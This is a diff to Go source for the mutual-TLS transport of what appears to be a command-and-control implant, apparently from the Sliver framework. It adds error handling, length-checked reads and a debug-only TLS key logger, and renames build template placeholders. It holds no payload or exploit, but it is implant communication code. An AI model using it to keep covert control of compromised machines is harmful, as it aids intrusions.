@@ -18,14 +18,16 @@ package mtls
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
-// {{if .Config.MTLSc2Enabled}}
+// {{if .Config.IncludeMTLS}}
 
 import (
 	"bytes"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/binary"
+	"errors"
 	"fmt"
+	"io"
 	"time"
 
 	// {{if .Config.Debug}}
@@ -43,13 +45,11 @@ var (
 	// PingInterval - Amount of time between in-band "pings"
 	PingInterval = 2 * time.Minute
 
-	readBufSize = 16 * 1024 // 16kb
-
 	// caCertPEM - PEM encoded CA certificate
-	caCertPEM = `{{.Config.MtlsCACert}}`
+	caCertPEM = `{{.Build.MtlsCACert}}`
 
-	keyPEM  = `{{.Config.MtlsKey}}`
-	certPEM = `{{.Config.MtlsCert}}`
+	keyPEM  = `{{.Build.MtlsKey}}`
+	certPEM = `{{.Build.MtlsCert}}`
 )
 
 // WriteEnvelope - Writes a message to the TLS socket using length prefix framing
@@ -65,8 +65,18 @@ func WriteEnvelope(connection *tls.Conn, envelope *pb.Envelope) error {
 	}
 	dataLengthBuf := new(bytes.Buffer)
 	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
-	connection.Write(dataLengthBuf.Bytes())
-	connection.Write(data)
+	if _, werr := connection.Write(dataLengthBuf.Bytes()); werr != nil {
+		// {{if .Config.Debug}}
+		log.Print("Error writing data length: ", werr)
+		// {{end}}
+		return werr
+	}
+	if _, werr := connection.Write(data); werr != nil {
+		// {{if .Config.Debug}}
+		log.Print("Error writing data: ", werr)
+		// {{end}}
+		return werr
+	}
 	return nil
 }
 
@@ -91,8 +101,8 @@ func ReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 	if len(dataLengthBuf) == 0 || connection == nil {
 		panic("[[GenerateCanary]]")
 	}
-	_, err := connection.Read(dataLengthBuf)
-	if err != nil {
+	n, err := io.ReadFull(connection, dataLengthBuf)
+	if err != nil || n != 4 {
 		// {{if .Config.Debug}}
 		log.Printf("Socket error (read msg-length): %v\n", err)
 		// {{end}}
@@ -100,23 +110,22 @@ func ReadEnvelope(connection *tls.Conn) (*pb.Envelope, error) {
 	}
 	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
 
-	// Read the length of the data
-	readBuf := make([]byte, readBufSize)
-	dataBuf := make([]byte, 0)
-	totalRead := 0
-	for {
-		n, err := connection.Read(readBuf)
-		dataBuf = append(dataBuf, readBuf[:n]...)
-		totalRead += n
-		if totalRead == dataLength {
-			break
-		}
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Read error: %s\n", err)
-			// {{end}}
-			break
-		}
+	if dataLength <= 0 {
+		// {{if .Config.Debug}}
+		log.Printf("[pivot] read error: %s\n", err)
+		// {{end}}
+		return nil, errors.New("[mtls] zero data length")
+	}
+
+	dataBuf := make([]byte, dataLength)
+
+	n, err = io.ReadFull(connection, dataBuf)
+
+	if err != nil || n != dataLength {
+		// {{if .Config.Debug}}
+		log.Printf("Read error: %s\n", err)
+		// {{end}}
+		return nil, err
 	}
 
 	// Unmarshal the protobuf envelope
@@ -168,8 +177,13 @@ func getTLSConfig() *tls.Config {
 			return cryptography.RootOnlyVerifyCertificate(caCertPEM, rawCerts, verifiedChains)
 		},
 	}
+	// {{if .Config.Debug}}
+	if cryptography.TLSKeyLogger != nil {
+		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
+	}
+	// {{end}}
 
 	return tlsConfig
 }
 
-// {{end}} -MTLSc2Enabled
+// {{end}} -IncludeMTLS
